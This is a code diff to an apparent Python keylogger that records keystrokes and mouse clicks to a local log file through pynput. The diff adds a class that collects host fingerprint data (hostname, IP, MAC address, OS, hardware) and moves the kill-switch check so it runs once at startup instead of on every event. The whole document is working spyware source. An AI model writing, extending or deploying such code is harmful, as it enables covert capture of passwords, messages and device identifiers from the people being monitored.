@@ -1,9 +1,11 @@
 from pynput.keyboard import Key, Listener as K
 from pynput.mouse import  Listener as M
-from threading import Timer
+from threading import Timer, Thread
 from datetime import datetime
 import os, sys
 from pathlib import Path
+import platform
+import psutil, socket, re, uuid, json
 
 
 # STATIC INPUTS
@@ -15,6 +17,34 @@ LOGGER_PATH = Path("./Logs/my_log.txt")
 LOGGER_PATH.parent.mkdir(parents=True, exist_ok=True)
 
 
+# Handling PII
+class PersonalInformationHandler:
+    def __init__(self) -> None:
+        self.start_date = datetime.now()
+        self.platform_info = ""
+
+    
+    # check info 
+    def check_info(self):
+        try:
+            info={}
+            info['platform']=platform.system()
+            info['platform-release']=platform.release()
+            info['platform-version']=platform.version()
+            info['architecture']=platform.machine()
+            info['hostname']=socket.gethostname()
+            info['ip-address']=socket.gethostbyname(socket.gethostname())
+            info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
+            info['processor']=platform.processor()
+            info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+            return json.dumps(info)
+        except Exception as e:
+            return e
+
+
+
+
+# for user input handling
 class KeyLogger:
     def __init__(self) -> None:
         self.log = ""
@@ -54,10 +84,7 @@ class KeyLogger:
     
     # a callback to for each key pressed
     def key_press(self, key):
-        
-        # check for kill switch 
-        self.check_file()
-        
+     
         # for currently pressed keys 
         self.pressed_keys.add(key)
         
@@ -86,7 +113,7 @@ class KeyLogger:
     # ---------------------------------------
     # Logging each click 
     def mouse_click(self, x, y, button, pressed):
-        self.check_file()
+    
         if pressed:
             self.log += f"\nMouse Click: {button} at ({x}, {y})\n"
         else:
@@ -110,6 +137,7 @@ class KeyLogger:
     # -------------------------------------------
     # starting the keylogger 
     def initiation(self):
+        self.check_file()
         self.K_listener = K(on_press=self.key_press, on_release=self.key_release)
         self.M_Listener = M(on_click=self.mouse_click, on_scroll=self.mouse_scroll)
         # Start the listener 
